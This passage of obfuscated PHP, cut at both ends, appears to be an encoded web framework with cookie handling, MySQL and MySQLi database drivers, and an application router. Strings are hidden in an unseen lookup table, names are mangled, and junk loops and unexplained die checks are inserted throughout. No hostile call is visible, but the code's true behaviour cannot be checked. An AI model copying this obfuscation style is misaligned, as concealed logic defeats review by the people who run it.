str_replace(HOST, $’éñ”×®[12], APP_HOST); $‡îáÇËÀ = _get($GLOBALS, $’éñ”×®[873], $‡îáÇËÀ); } $üºÇó¹ = $’éñ”×®[12]; setcookie($ğšô»…Ğ, $…Ï¶ãÄ°, time() + $µ˜ê¬Î, $’éñ”×®[8] . trim($‡îáÇËÀ, $’éñ”×®[8]) . $üºÇó¹, !1, !1, $Éåİ¡“±); } public static function setSafe($¢›Æ³ËÄ, $Ùó¦øŸ, $ÍÁáİ ê = 0) { self::set($¢›Æ³ËÄ, $Ùó¦øŸ, $ÍÁáİ ê, !0); } public static function get($ÀàğŞÚ—) { static $û¢Ğ¢óù = false; if (!$û¢Ğ¢óù) { self::initHeaderCookie(); $û¢Ğ¢óù = !0; } return isset($_COOKIE[$ÀàğŞÚ—]) ? $_COOKIE[$ÀàğŞÚ—] : !1; } private static function initHeaderCookie() { $ßÁ›ß¿ =& $_SERVER[Æ š¦İÈ]; if (!isset($_SERVER[$ßÁ›ß¿[874]]) || !$_SERVER[$ßÁ›ß¿[874]]) { return; } $«ÁÎÑ÷À = explode($ßÁ›ß¿[71], $_SERVER[$ßÁ›ß¿[874]]); foreach ($«ÁÎÑ÷À as $ò©¥ŸÅÛ) { $ò©¥ŸÅÛ = explode($ßÁ›ß¿[875], $ò©¥ŸÅÛ); if (count($ò©¥ŸÅÛ) != 2 || !isset($ò©¥ŸÅÛ[1])) { continue; } $_COOKIE[trim($ò©¥ŸÅÛ[0])] = trim($ò©¥ŸÅÛ[1]); } } public static function remove($ÚÂºğ¦ø, $ÉŠ˜òÖ = false) { unset($_COOKIE[$ÚÂºğ¦ø]); self::set($ÚÂºğ¦ø, $_SERVER[Æ š¦İÈ][12], 1, $ÉŠ˜òÖ); } } class DbMysql extends Db { public function __construct($ÚƒÎÚÜ½ = '') { $‘¤ÍÉü =& $_SERVER[Æ š¦İÈ]; if (!extension_loaded($‘¤ÍÉü[801])) { think_exception(think_lang($‘¤ÍÉü[14]) . $‘¤ÍÉü[876]); } if (!empty($ÚƒÎÚÜ½)) { $this->config = $ÚƒÎÚÜ½; if (empty($this->config[$‘¤ÍÉü[17]])) { $this->config[$‘¤ÍÉü[17]] = $‘¤ÍÉü[12]; } } } public function connect($Ø½à™û­ = '', $õ½Ÿó´ = 0, $ªĞ¦¿ìÈ = false) { $ŠéÁÙŒš =& $_SERVER[Æ š¦İÈ]; if (!isset($this->linkID[$õ½Ÿó´])) { if (empty($Ø½à™û­)) { $Ø½à™û­ = $this->config; } $¶±•èË½ = $Ø½à™û­[$ŠéÁÙŒš[877]] . ($Ø½à™û­[$ŠéÁÙŒš[878]] ? "\x3a{$Ø½à™û­[$ŠéÁÙŒš[878]]}" : $ŠéÁÙŒš[12]); $Ò³êªğú = !empty($Ø½à™û­[$ŠéÁÙŒš[17]][$ŠéÁÙŒš[18]]) ? $Ø½à™û­[$ŠéÁÙŒš[17]][$ŠéÁÙŒš[18]] : $this->pconnect; if ($Ò³êªğú) { $this->linkID[$õ½Ÿó´] = mysql_pconnect($¶±•èË½, $Ø½à™û­[$ŠéÁÙŒš[879]], $Ø½à™û­[$ŠéÁÙŒš[880]], 131072); } else { $this->linkID[$õ½Ÿó´] = mysql_connect($¶±•èË½, $Ø½à™û­[$ŠéÁÙŒš[879]], $Ø½à™û­[$ŠéÁÙŒš[880]], !0, 131072); } if (!$this->linkID[$õ½Ÿó´] || !empty($Ø½à™û­[$ŠéÁÙŒš[21]]) && !mysql_select_db($Ø½à™û­[$ŠéÁÙŒš[21]], $this->linkID[$õ½Ÿó´])) { think_exception(mysql_error()); } $Ò ÷‚›ø = mysql_get_server_info($this->linkID[$õ½Ÿó´]); mysql_query($ŠéÁÙŒš[881] . think_config($ŠéÁÙŒš[882]) . $ŠéÁÙŒš[58], $this->linkID[$õ½Ÿó´]); if ($Ò ÷‚›ø > $ŠéÁÙŒš[883]) { mysql_query($ŠéÁÙŒš[884], $this->linkID[$õ½Ÿó´]); } $this->connected = !0; if (1 != think_config($ŠéÁÙŒš[22])) { unset($this->config); } } return $this->linkID[$õ½Ÿó´]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Ç áË¥) { $Ùüù¹­á =& $_SERVER[Æ š¦İÈ]; if (0 === stripos($Ç áË¥, $Ùüù¹­á[261])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ç áË¥; if ($this->queryID) { $this->free(); } think_action_status($Ùüù¹­á[23], 1); think_status($Ùüù¹­á[24]); $this->queryID = mysql_query($Ç áË¥, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($äÈäñéŸ) { $ôÊàÌ‘ =& $_SERVER[Æ š¦İÈ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $äÈäñéŸ; if ($this->queryID) { $this->free(); } think_action_status($ôÊàÌ‘[25], 1); think_status($ôÊàÌ‘[24]); $÷’¯­öÆ = mysql_query($äÈäñéŸ, $this->_linkID); $this->debug(); if (!1 === $÷’¯­öÆ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Æ š¦İÈ][885], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ğÙ´ò‹É = mysql_query($_SERVER[Æ š¦İÈ][886], $this->_linkID); $this->transTimes = 0; if (!$ğÙ´ò‹É) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $à¶Ê¦‹ = mysql_query($_SERVER[Æ š¦İÈ][887], $this->_linkID); $this->transTimes = 0; if (!$à¶Ê¦‹) { $this->error(); return !1; } } return !0; } private function getAll() { $Ê½£ä¿Ú = array(); if ($this->numRows > 0) { while ($Éü¿ª™˜ = mysql_fetch_assoc($this->queryID)) { $Ê½£ä¿Ú[] = $Éü¿ª™˜; } mysql_data_seek($this->queryID, 0); } return $Ê½£ä¿Ú; } public function getFields($·î­›Ûª) { $øÂ¾Şµ» =& $_SERVER[Æ š¦İÈ]; $øÒÀš™ö = $this->query($øÂ¾Şµ»[888] . $this->parseKey($·î­›Ûª)); $‘‚İÕ¾ = array(); if ($øÒÀš™ö) { foreach ($øÒÀš™ö as $¡ìÄŠäµ => $·ÎÛšö–) { $‘‚İÕ¾[$·ÎÛšö–[$øÂ¾Şµ»[31]]] = array($øÂ¾Şµ»[32] => $·ÎÛšö–[$øÂ¾Şµ»[31]], $øÂ¾Şµ»[33] => $·ÎÛšö–[$øÂ¾Şµ»[34]], $øÂ¾Şµ»[35] => (bool) (strtoupper($·ÎÛšö–[$øÂ¾Şµ»[36]]) === $øÂ¾Şµ»[889]), $øÂ¾Şµ»[37] => $·ÎÛšö–[$øÂ¾Şµ»[38]], $øÂ¾Şµ»[39] => strtolower($·ÎÛšö–[$øÂ¾Şµ»[40]]) == $øÂ¾Şµ»[41], $øÂ¾Şµ»[42] => strtolower($·ÎÛšö–[$øÂ¾Şµ»[43]]) == $øÂ¾Şµ»[44]); } } return $‘‚İÕ¾; } public function getTables($ûÁÉïñ = '') { $øğôˆ¯´ =& $_SERVER[Æ š¦İÈ]; if (!empty($ûÁÉïñ)) { $¢×ÎÓ«» = $øğôˆ¯´[890] . $ûÁÉïñ . $øğôˆ¯´[891]; } else { $¢×ÎÓ«» = $øğôˆ¯´[892]; } $â¿ş×· = $this->query($¢×ÎÓ«»); $å—Èù  = array(); foreach ($â¿ş×· as $æı…ÅÅ€ => $Òˆó…Œß) { $å—Èù [$æı…ÅÅ€] = current($Òˆó…Œß); } return $å—Èù ; } public function replace($¡Õ“Î, $Á°üØõ´ = array()) { $íÔ“ãØé =& $_SERVER[Æ š¦İÈ]; foreach ($¡Õ“Î as $ ƒüÚ” => $Ğø©™´) { $Ş©¤ÇÏÀ = $this->parseValue($Ğø©™´); if (is_scalar($Ş©¤ÇÏÀ)) { $ĞÀÓáØƒ[] = $Ş©¤ÇÏÀ; $‰êœ«‘ü[] = $this->parseKey($ ƒüÚ”); } } $Š¨Ëè”à = $íÔ“ãØé[893] . $this->parseTable($Á°üØõ´[$íÔ“ãØé[276]]) . $íÔ“ãØé[894] . implode($íÔ“ãØé[50], $‰êœ«‘ü) . $íÔ“ãØé[895] . implode($íÔ“ãØé[50], $ĞÀÓáØƒ) . $íÔ“ãØé[896]; return $this->execute($Š¨Ëè”à); } public function insertAll($‰ßî‘÷ª, $Ù“ßÉÛß = array(), $ºï€¢ù¬ = false) { $”’ã¹™İ =& $_SERVER[Æ š¦İÈ]; if (!is_array($‰ßî‘÷ª[0])) { return !1; } $ª×÷†— = array_keys($‰ßî‘÷ª[0]); $È±¡ì×Œ = array(); foreach ($‰ßî‘÷ª as $òØ¨íˆ¢) { $ÂœĞç´« = array(); foreach ($òØ¨íˆ¢ as $…œ€Óª => $ª¾µÈ) { $ª¾µÈ = $this->parseValue($ª¾µÈ); if (is_scalar($ª¾µÈ)) { $ÂœĞç´«[] = $ª¾µÈ; } } $È±¡ì×Œ[] = $”’ã¹™İ[257] . implode($”’ã¹™İ[50], $ÂœĞç´«) . $”’ã¹™İ[896]; } array_walk($ª×÷†—, array($this, $”’ã¹™İ[897])); $‚ç÷Ùßè = ($ºï€¢ù¬ ? $”’ã¹™İ[898] : $”’ã¹™İ[899]) . $”’ã¹™İ[900] . $this->parseTable($Ù“ßÉÛß[$”’ã¹™İ[276]]) . $”’ã¹™İ[894] . implode($”’ã¹™İ[50], $ª×÷†—) . $”’ã¹™İ[901] . implode($”’ã¹™İ[50], $È±¡ì×Œ); return $this->execute($‚ç÷Ùßè); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $´‹®·×“ =& $_SERVER[Æ š¦İÈ]; $this->error = mysql_errno() . $´‹®·×“[4] . mysql_error($this->_linkID); if ($´‹®·×“[12] != $this->queryStr) { $this->error .= LNG($´‹®·×“[48]) . $this->queryStr; } think_trace($this->error, $´‹®·×“[12], $´‹®·×“[49]); return $this->error; } public function escapeString($ÃŠ³Ç³Ó) { if ($this->_linkID) { return mysql_real_escape_string($ÃŠ³Ç³Ó, $this->_linkID); } else { return mysql_escape_string($ÃŠ³Ç³Ó); } } public function parseKey(&$²õˆ¸†—, $¹˜ğÇ½» = true) { $’ˆ¢Âœ  =& $_SERVER[Æ š¦İÈ]; if ($¹˜ğÇ½») { $²õˆ¸†— = $this->parseKeyCheck($²õˆ¸†—); } if ($²õˆ¸†— != $’ˆ¢Âœ [183] && !preg_match($’ˆ¢Âœ [902], $²õˆ¸†—)) { $²õˆ¸†— = $’ˆ¢Âœ [382] . trim($²õˆ¸†—, $’ˆ¢Âœ [382]) . $’ˆ¢Âœ [382]; } return $²õˆ¸†—; } } class DbMysqli extends Db { public function __construct($ÕÌèÛ¯ = '') { $”çä‹ÂÑ =& $_SERVER[Æ š¦İÈ]; if (!extension_loaded($”çä‹ÂÑ[903])) { think_exception(think_lang($”çä‹ÂÑ[14]) . $”çä‹ÂÑ[904]); } if (!empty($ÕÌèÛ¯)) { $this->config = $ÕÌèÛ¯; if (empty($this->config[$”çä‹ÂÑ[17]])) { $this->config[$”çä‹ÂÑ[17]] = $”çä‹ÂÑ[12]; } } } public function connect($ğ¨Šïæ = '', $£ŞÛ¤Â… = 0) { $ƒ¾ı­Ô° =& $_SERVER[Æ š¦İÈ]; if (!isset($this->linkID[$£ŞÛ¤Â…])) { if (empty($ğ¨Šïæ)) { $ğ¨Šïæ = $this->config; } $this->linkID[$£ŞÛ¤Â…] = new mysqli($ğ¨Šïæ[$ƒ¾ı­Ô°[877]], $ğ¨Šïæ[$ƒ¾ı­Ô°[879]], $ğ¨Šïæ[$ƒ¾ı­Ô°[880]], $ğ¨Šïæ[$ƒ¾ı­Ô°[21]], $ğ¨Šïæ[$ƒ¾ı­Ô°[878]] ? intval($ğ¨Šïæ[$ƒ¾ı­Ô°[878]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $à¿ó—½ = $this->linkID[$£ŞÛ¤Â…]->server_version; $this->linkID[$£ŞÛ¤Â…]->query($ƒ¾ı­Ô°[881] . think_config($ƒ¾ı­Ô°[882]) . $ƒ¾ı­Ô°[58]); if ($à¿ó—½ > $ƒ¾ı­Ô°[883]) { $this->linkID[$£ŞÛ¤Â…]->query($ƒ¾ı­Ô°[884]); } $this->connected = !0; if (1 != think_config($ƒ¾ı­Ô°[22])) { unset($this->config); } } return $this->linkID[$£ŞÛ¤Â…]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($şâ‡‰¦) { $—ïºã¼å =& $_SERVER[Æ š¦İÈ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $şâ‡‰¦; if ($this->queryID) { $this->free(); } think_action_status($—ïºã¼å[23], 1); think_status($—ïºã¼å[24]); $this->queryID = $this->_linkID->query($şâ‡‰¦); if ($this->_linkID->more_results()) { while (($©ó•™¶ = $this->_linkID->next_result()) != NULL) { $©ó•™¶->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($¢«¨ï®ò) { $èÅŠ‘€˜ =& $_SERVER[Æ š¦İÈ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¢«¨ï®ò; if ($this->queryID) { $this->free(); } think_action_status($èÅŠ‘€˜[25], 1); think_status($èÅŠ‘€˜[24]); $šŒ³·ÛÁ = $this->_linkID->query($¢«¨ï®ò); $this->debug(); if (!1 === $šŒ³·ÛÁ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $âÂÀ¢¨ö = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$âÂÀ¢¨ö) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ı‡´óœè = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ı‡´óœè) { $this->error(); return !1; } } return !0; } private function getAll() { $óéÔÒ» = array(); if ($this->numRows > 0) { for ($¹…ç¶É = 0; $¹…ç¶É < $this->numRows; $¹…ç¶É++) { $óéÔÒ»[$¹…ç¶É] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $óéÔÒ»; } public function getFields($´‘àùå©) { $Ÿêú¿İÂ =& $_SERVER[Æ š¦İÈ]; $·Š¯áö­ = $this->query($Ÿêú¿İÂ[888] . $this->parseKey($´‘àùå©)); $Ö¢ÓË÷š = array(); if ($·Š¯áö­) { foreach ($·Š¯áö­ as $ó®‡í„ => $¬«µÒ¾) { $Ö¢ÓË÷š[$¬«µÒ¾[$Ÿêú¿İÂ[31]]] = array($Ÿêú¿İÂ[32] => $¬«µÒ¾[$Ÿêú¿İÂ[31]], $Ÿêú¿İÂ[33] => $¬«µÒ¾[$Ÿêú¿İÂ[34]], $Ÿêú¿İÂ[35] => (bool) ($¬«µÒ¾[$Ÿêú¿İÂ[36]] === $Ÿêú¿İÂ[12]), $Ÿêú¿İÂ[37] => $¬«µÒ¾[$Ÿêú¿İÂ[38]], $Ÿêú¿İÂ[39] => strtolower($¬«µÒ¾[$Ÿêú¿İÂ[40]]) == $Ÿêú¿İÂ[41], $Ÿêú¿İÂ[42] => strtolower($¬«µÒ¾[$Ÿêú¿İÂ[43]]) == $Ÿêú¿İÂ[44]); } } return $Ö¢ÓË÷š; } public function getTables($ÓÌÎÉÄ = '') { $Æ·¥ô¶ì =& $_SERVER[Æ š¦İÈ]; $ûÀå÷’“ = !empty($ÓÌÎÉÄ) ? $Æ·¥ô¶ì[890] . $ÓÌÎÉÄ . $Æ·¥ô¶ì[891] : $Æ·¥ô¶ì[892]; $Ÿšüæ‰… = $this->query($ûÀå÷’“); $´Ú–» = array(); if ($Ÿšüæ‰…) { foreach ($Ÿšüæ‰… as $øĞõ½ÙÎ => $îª‡í¤ö) { $´Ú–»[$øĞõ½ÙÎ] = current($îª‡í¤ö); } } return $´Ú–»; } public function replace($²ÕÍÑõü, $òœœ™ê† = array()) { $éåÕµ• =& $_SERVER[Æ š¦İÈ]; foreach ($²ÕÍÑõü as $‰å‹€Ó› => $»£±’–ª) { $û÷­˜‰ã = $this->parseValue($»£±’–ª); if (is_scalar($û÷­˜‰ã)) { $×±ÉÙã”[] = $û÷­˜‰ã; $±ù’öã•[] = $this->parseKey($‰å‹€Ó›); } } $ÁÒ¾ô ı = $éåÕµ•[893] . $this->parseTable($òœœ™ê†[$éåÕµ•[276]]) . $éåÕµ•[894] . implode($éåÕµ•[50], $±ù’öã•) . $éåÕµ•[895] . implode($éåÕµ•[50], $×±ÉÙã”) . $éåÕµ•[896]; return $this->execute($ÁÒ¾ô ı); } public function insertAll($…ô®ş, $ü‡«¬ = array(), $†¥øÅºŸ = false) { $ôéèÇ =& $_SERVER[Æ š¦İÈ]; if (!is_array($…ô®ş[0])) { return !1; } $Åá¹ğÊ– = array_keys($…ô®ş[0]); $•œÅˆı = array(); foreach ($…ô®ş as $¡†»ãÓã) { $›é¿ ê® = array(); foreach ($¡†»ãÓã as $ÇàÕÆå  => $£ Ü¿¤) { $£ Ü¿¤ = $this->parseValue($£ Ü¿¤); if (is_scalar($£ Ü¿¤)) { $›é¿ ê®[] = $£ Ü¿¤; } } $•œÅˆı[] = $ôéèÇ[257] . implode($ôéèÇ[50], $›é¿ ê®) . $ôéèÇ[896]; } array_walk($Åá¹ğÊ–, array($this, $ôéèÇ[897])); $Ş×ÄåÍÆ = $†¥øÅºŸ ? $ôéèÇ[898] : $ôéèÇ[899]; $ªÁû«£¶ = $Ş×ÄåÍÆ . $ôéèÇ[900] . $this->parseTable($ü‡«¬[$ôéèÇ[276]]) . $ôéèÇ[894] . implode($ôéèÇ[50], $Åá¹ğÊ–) . $ôéèÇ[901] . implode($ôéèÇ[50], $•œÅˆı); return $this->execute($ªÁû«£¶); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ÍØŞâœ„ =& $_SERVER[Æ š¦İÈ]; $this->error = $this->_linkID->errno . $ÍØŞâœ„[4] . $this->_linkID->error; if ($ÍØŞâœ„[12] != $this->queryStr) { $this->error .= LNG($ÍØŞâœ„[48]) . $this->queryStr; } think_trace($this->error, $ÍØŞâœ„[12], $ÍØŞâœ„[49]); return $this->error; } public function escapeString($§ÖÖÓ¾Ú) { if ($this->_linkID) { return $this->_linkID->real_escape_string($§ÖÖÓ¾Ú); } else { return addslashes($§ÖÖÓ¾Ú); } } public function parseKey(&$£ß‘¦¦®, $ƒšŸ¯ò = true) { $“©Âı¶ä =& $_SERVER[Æ š¦İÈ]; if ($ƒšŸ¯ò) { $£ß‘¦¦® = $this->parseKeyCheck($£ß‘¦¦®); } if ($£ß‘¦¦® != $“©Âı¶ä[183] && !preg_match($“©Âı¶ä[902], $£ß‘¦¦®)) { $£ß‘¦¦® = $“©Âı¶ä[382] . trim($£ß‘¦¦®, $“©Âı¶ä[382]) . $“©Âı¶ä[382]; } return $£ß‘¦¦®; } } goto C›Æ«·§Ô‹; eÚñĞ–ôÍù: class Application { private $defaultModule = "\x69\156\144\145\170"; private $defaultController = "\x69\x6e\x64\x65\x78"; private $defaultAction = "\x69\156\x64\145\170"; function __construct() { } public function setDefault($½¾•”ªÃ) { $ˆ™ğÆñ³ =& $_SERVER[Æ š¦İÈ]; $©ı»ëàï =& $_SERVER[â­¶Àş‹]; $¤ìÊÛ¨¨ = explode($©ı»ëàï[0], trim($½¾•”ªÃ, $©ı»ëàï[0])); $this->defaultModule = $¤ìÊÛ¨¨[0] ? $¤ìÊÛ¨¨[0] : $this->defaultModule; $–½Ğ½‰Ø = $ˆ™ğÆñ³[612]; if (strlen($–½Ğ½‰Ø) < $ˆ™ğÆñ³[613]) { die; } $this->defaultController = $¤ìÊÛ¨¨[1] ? $¤ìÊÛ¨¨[1] : $this->defaultController; $‚ÙªÄ©× = $ˆ™ğÆñ³[614]; if (!$‚ÙªÄ©×) { return; } $this->defaultAction = $¤ìÊÛ¨¨[2] ? $¤ìÊÛ¨¨[2] : $this->defaultAction; $this->teyu34bd47b3($©ı»ëàï[1], array($this, $©ı»ëàï[2])); $ÅˆÀ¤îÈ = $ˆ™ğÆñ³[615]; if (!$ÅˆÀ¤îÈ) { die; } } public function appRun($Úå¥ŒµÏ) { $›‚àßı =& $_SERVER[Æ š¦İÈ]; $âéÇàÂ¡ =& $_SERVER[â­¶Àş‹]; $…ëŒ‡Ë¨ = explode($âéÇàÂ¡[0], $Úå¥ŒµÏ); $¦ƒ·ä§û = $›‚àßı[616]; if (!$¦ƒ·ä§û) { return; } $µáëÖİ± = strtolower($…ëŒ‡Ë¨[0]); $»“è®÷Œ = $âéÇàÂ¡[3]; if ($µáëÖİ± == $âéÇàÂ¡[4]) { $»“è®÷Œ = $âéÇàÂ¡[5]; $…ëŒ‡Ë¨[0] = $âéÇàÂ¡[6]; $…ëŒ‡Ë¨[1] = $…ëŒ‡Ë¨[1] . $âéÇàÂ¡[7]; $Úå¥ŒµÏ = join($âéÇàÂ¡[0], $…ëŒ‡Ë¨); $Úå¥ŒµÏ = trim($Úå¥ŒµÏ, $âéÇàÂ¡[0]); } call_user_func(array($âéÇàÂ¡[8], $âéÇàÂ¡[9]), $»“è®÷Œ . $âéÇàÂ¡[10], $Úå¥ŒµÏ); ActionCall($Úå¥ŒµÏ); $™øÊìıÌ = $›‚àßı[617]; if (!$™øÊìıÌ) { die; } call_user_func(array($âéÇàÂ¡[8], $âéÇàÂ¡[9]), $»“è®÷Œ . $âéÇàÂ¡[11], $Úå¥ŒµÏ); $Â†´ùƒ¬ = $›‚àßı[618]; } private function autorun() { $ÃàäÎ¶¾ =& $_SERVER[Æ š¦İÈ]; $šÉ¬ªôÏ =& $_SERVER[â­¶Àş‹]; global $config; $İùî´ = $ÃàäÎ¶¾[619]; while ($İùî´ < $ÃàäÎ¶¾[620]) { if ($İùî´ >= 0) { break; } $İùî´++; } if (count($config[$šÉ¬ªôÏ[12]]) == 0) { return; } foreach ($config[$šÉ¬ªôÏ[12]] as $ÅåÚéÕä => $òÅ•°ˆ·) { $this->appRun($òÅ•°ˆ·); $×ĞÕõÏÜ = $ÃàäÎ¶¾[621]; if (!$×ĞÕõÏÜ) { return; } } } private function rgoz9f469dd8() { $²Í£ã®¼ =& $_SERVER[Æ š¦İÈ]; $¸ÛıŸ³ =& $_SERVER[â­¶Àş‹]; $¦Œ±ç’š = $¸ÛıŸ³[4]; $¬±ŠÍ” = $²Í£ã®¼[622]; $ˆñ»ŞÇü = $GLOBALS[$¸ÛıŸ³[13]][$¸ÛıŸ³[14]][0]; if (!$ˆñ»ŞÇü || strlen($ˆñ»ŞÇü) <= strlen($¦Œ±ç’š)) { return; } if (strtolower(substr($ˆñ»ŞÇü, -strlen($¦Œ±ç’š))) != $¦Œ±ç’š) { return; } $Ó¸¥Ô³Ñ = substr($ˆñ»ŞÇü, 0, -strlen($¦Œ±ç’š)); $¹Œ‡ı›ç = array($¸ÛıŸ³[4], $Ó¸¥Ô³Ñ); $şİ€öœ‰ = array_slice($GLOBALS[$¸ÛıŸ³[13]][$¸ÛıŸ³[14]], 1); $GLOBALS[$¸ÛıŸ³[13]][$¸ÛıŸ³[14]] = array_merge($¹Œ‡ı›ç, $şİ€öœ‰); $Œàæ¢‘‚ = $²Í£ã®¼[623]; if (!$Œàæ¢‘‚) { die; } $GLOBALS[$¸ÛıŸ³[13]][$¸ÛıŸ³[15]] = implode($¸ÛıŸ³[0], $GLOBALS[$¸ÛıŸ³[13]][$¸ÛıŸ³[14]]); $ê² ›ÌŒ = $²Í£ã®¼[624]; if (strlen($ê² ›ÌŒ) < $²Í£ã®¼[620]) { return; } } private function unvaadb20db3() { $«‚µš›Û =& $_SERVER[Æ š¦İÈ]; $Å„ú€‚› =& $_SERVER[â­¶Àş‹]; if ($GLOBALS[$Å„ú€‚›[13]][$Å„ú€‚›[15]] != $Å„ú€‚›[6]) { return; } $¢Ğî¾Ô– = $_SERVER[$Å„ú€‚›[16]]; $š×£å§ = $«‚µš›Û[625]; $†À§şò = $Å„ú€‚›[17]; if (!strstr($¢Ğî¾Ô–, $†À§şò)) { return; } $Ïš«õŸî = strrpos($¢Ğî¾Ô–, $†À§şò); $ÂÕÚÂ = $«‚µš›Û[626]; while (strlen($ÂÕÚÂ) < $«‚µš›Û[396]) { if (!$ÂÕÚÂ) { break; } $ÂÕÚÂ++; } $æå¤àË = substr($¢Ğî¾Ô–, $Ïš«õŸî + strlen($†À§şò)); preg_match_all($Å„ú€‚›[18], $æå¤àË, $ˆš÷ªŞú); $æå¤àË = trim($ˆš÷ªŞú[0][0], $Å„ú€‚›[19]); $’’¢Ñê— = $«‚µš›Û[627]; $GLOBALS[$Å„ú€‚›[13]][$Å„ú€‚›[14]] = explode($Å„ú€‚›[19], $æå¤àË); $GLOBALS[$Å„ú€‚›[13]][$Å„ú€‚›[15]] = implode($Å„ú€‚›[0], $GLOBALS[$Å„ú€‚›[13]][$Å„ú€‚›[14]]); } public function run() { $‘–ÍëáË =& $_SERVER[Æ š¦İÈ]; $£è˜â =& $_SERVER[â­¶Àş‹]; $this->unvaadb20db3(); $this->rgoz9f469dd8(); $¸¶õöœ = $‘–ÍëáË[628]; if (!$¸¶õöœ) { return; } $¤ºÖê­” = $GLOBALS[$£è˜â[13]][$£è˜â[14]]; $ÍÃ×ß¼Á = $‘–ÍëáË[629]; $‹ÊˆÕ¹Ò = $GLOBALS[$£è˜â[13]][$£è˜â[15]]; define($£è˜â[20], isset($¤ºÖê­”[0]) && $¤ºÖê­”[0] ? $¤ºÖê­”[0] : $this->defaultModule); $õ’şö‚Ï = $‘–ÍëáË[630]; if (strlen($õ’şö‚Ï) < $‘–ÍëáË[631]) { die; } define($£è˜â[21], isset($¤ºÖê­”[1]) && $¤ºÖê­”[0] ? $¤ºÖê­”[1] : $this->defaultController); $˜‘”ÒÙ = $‘–ÍëáË[632]; while (strlen($˜‘”ÒÙ) < $‘–ÍëáË[631]) { if (!$˜‘”ÒÙ) { break; } $˜‘”ÒÙ++; } define($£è˜â[22], isset($¤ºÖê­”[2]) && $¤ºÖê­”[0] ? $¤ºÖê­”[2] : $this->defaultAction); define($£è˜â[23], MOD . $£è˜â[0] . ST . $£è˜â[0] . ACT); $_SERVER[$£è˜â[24]] = strtolower(ACTION); $ÁâÌƒŞ = $‘–ÍëáË[633]; while ($ÁâÌƒŞ < $‘–ÍëáË[634]) { if ($ÁâÌƒŞ >= 0) { break; } $ÁâÌƒŞ++; } $this->autorun(); $©¦šÊ½» = $‘–ÍëáË[635]; while ($©¦šÊ½» < $‘–ÍëáË[631]) { if ($©¦šÊ½» >= 0) { break; } $©¦šÊ½»++; } if (count($¤ºÖê­”) >= 3) { $this->appRun($‹ÊˆÕ¹Ò); } else { $this->appRun(ACTION); } } private $demrd2edb119 = array(); private $scvibb4abc8d = ''; public function nrag29104469() { $âºÚ†æâ =& $_SERVER[Æ š¦İÈ]; $¢ÕŒ³¿ =& $_SERVER[â­¶Àş‹]; $this->xrtv91fadeca(); $˜ó§ë·Ÿ = $âºÚ†æâ[636]; while ($˜ó§ë·Ÿ < $âºÚ†æâ[396]) { if ($˜ó§ë·Ÿ >= 0) { break; } $˜ó§ë·Ÿ++; } $this->hpqm7e6f92c2(); $this->nhymd432b709(); $Å§Œ›€ = $âºÚ†æâ[637]; if (strlen($Å§Œ›€) < $âºÚ†æâ[620]) { die; } $this->wraibd915145(); $this->zgsb0f16b8d2(); $this->sdxib26deafc(); $this->ysoj6219fb7f(); $this->teyu34bd47b3($¢ÕŒ³¿[25], array($this, $¢ÕŒ³¿[26])); $¡İÊõÅ = $âºÚ†æâ[638]; if (!$¡İÊõÅ) { return; } $this->teyu34bd47b3($¢ÕŒ³¿[27], array($this, $¢ÕŒ³¿[28])); $this->teyu34bd47b3($¢ÕŒ³¿[29], array($this, $¢ÕŒ³¿[30])); $this->teyu34bd47b3($¢ÕŒ³¿[31], array($this, $¢ÕŒ³¿[32])); $ü£•Ôö² = $âºÚ†æâ[639]; } public function ywqta7404209($òŸÛûı) { $è†óÛ‡‹ =& $_SERVER[Æ š¦İÈ]; $¿ ¦ô =& $_SERVER[â­¶Àş‹]; $ÁößâÀ = Model($¿ ¦ô[33])->get(); $ãøØÃ‰Ç = $è†óÛ‡‹[640]; if (!$ãøØÃ‰Ç) { return; } $‰Õ–ƒ‚ = array($¿ ¦ô[34], $¿ ¦ô[35], $¿ ¦ô[36], $¿ ¦ô[37], $¿ ¦ô[38], $¿ ¦ô[39], $¿ ¦ô[40], $¿ ¦ô[41], $¿ ¦ô[42], $¿ ¦ô[43], $¿ ¦ô[44], $¿ ¦ô[45], $¿ ¦ô[46], $¿ ¦ô[47], $¿ ¦ô[48], $¿ ¦ô[49], $¿ ¦ô[50], $¿ ¦ô[51], $¿ ¦ô[52], $¿ ¦ô[53], $¿ ¦ô[54], $¿ ¦ô[55], $¿ ¦ô[56], $¿ ¦ô[57], $¿ ¦ô[58], $¿ ¦ô[59], $¿ ¦ô[60], $¿ ¦ô[61], $¿ ¦ô[62], $¿ ¦ô[63], $¿ ¦ô[64], $¿ ¦ô[65], $¿ ¦ô[66], $¿ ¦ô[67], 